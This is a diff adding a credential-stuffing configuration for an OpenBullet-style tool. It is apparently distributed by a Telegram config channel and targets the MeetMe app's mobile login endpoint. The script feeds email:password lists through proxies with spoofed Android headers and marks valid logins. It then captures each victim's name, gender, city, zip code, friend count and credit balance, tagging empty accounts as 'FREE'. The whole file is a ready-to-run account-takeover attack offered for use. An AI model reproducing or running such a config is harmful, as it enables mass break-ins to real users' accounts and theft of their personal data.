@@ -1,0 +1,106 @@
+[SETTINGS]
+{
+  "Name": "Meet Me iOS API#Configs-Gram",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-02T07:14:54.093241+00:00",
+  "AdditionalInfo": "Join us @Configs_Gram",
+  "Author": "@Harry8727",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "S" 
+
+FUNCTION GenerateGUID -> VAR "1" 
+
+REQUEST POST "https://ssl.meetme.com/mobile/login" 
+  CONTENT "emailId=<USER>&password=<PASS>&fbAccessToken=&deviceVerifications=&lat=&long=&systemInfo=&sessionId=<S>&sessionState=1&rememberMe=&skipResponseKeys=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip" 
+  HEADER "accept-language: en-US" 
+  HEADER "content-length: 198" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "user-agent: okhttp/3.12.12" 
+  HEADER "x-authtoken: d41d8cd98f00b204e9800998ecf8427e,6c98bec8a789d84a8530393cb6aac93d," 
+  HEADER "x-counts: 0" 
+  HEADER "x-device: android,<1>,2950:2950" 
+  HEADER "x-notificationtypes: friendAccept,newMatch,boostChat,smileSent,newMemberAlert" 
+  HEADER "x-stats: {\"events\":{\"screens\":{\"LoginActivity\":{\"viewed\":1},\"RegistrationActivity\":{\"viewed\":1}}},\"memTotal\":536870912,\"memUsed\":10870488,\"methods\":[{\"callback\":0.219,\"key\":\"countries\",\"parse\":0.056,\"roundTrip\":0.439},{\"callback\":0.099,\"key\":\"countries\",\"parse\":0.017,\"roundTrip\":0.343},{\"callback\":0.009,\"key\":\"states\",\"parse\":0.003,\"roundTrip\":0.445}]}" 
+  HEADER "x-supportedfeatures: messageStickers,StackedNotifications:v6,tags,twoStepRegistration,chatSuggestions,purchaseRevamp,registrationSingleNameLabelsInFields,strictHttps,realtimeAtLogin,meetQueueSayHi,registrationTestValidation,MediaLinkMessages:v1,liveVideo,SurfaceChat:v1,chatGiftMessage,faceVerification,requestInbox,perimeterX:v1,photoLikeMessage:v2" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "errorType\":\"LoginException" 
+    KEY "errorCode\":5001" 
+    KEY "errorCode\":6000" 
+  KEYCHAIN Success OR 
+    KEY "memberId" 
+
+PARSE "<SOURCE>" JSON "first_name" CreateEmpty=FALSE -> CAP "Name" 
+
+PARSE "<SOURCE>" JSON "gender" CreateEmpty=FALSE -> CAP "Gender" 
+
+PARSE "<SOURCE>" JSON "interested_in" CreateEmpty=FALSE -> CAP "Intrested" 
+
+PARSE "<SOURCE>" JSON "city" CreateEmpty=FALSE -> CAP "City" 
+
+PARSE "<SOURCE>" JSON "country" CreateEmpty=FALSE -> CAP "Country" 
+
+PARSE "<SOURCE>" JSON "zip_code" CreateEmpty=FALSE -> CAP "Zip" 
+
+PARSE "<SOURCE>" JSON "level" CreateEmpty=FALSE -> CAP "Level" 
+
+PARSE "<SOURCE>" JSON "profileViews" CreateEmpty=FALSE -> CAP "Profile Views" 
+
+PARSE "<SOURCE>" JSON "friendCount" CreateEmpty=FALSE -> CAP "Friends Count" 
+
+PARSE "<SOURCE>" JSON "creditsBalance" CreateEmpty=FALSE -> CAP "Credits" 
+
+FUNCTION Constant "@Configs_Gram" -> CAP "Join us" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<CREDIT>" EqualTo "0" 
+
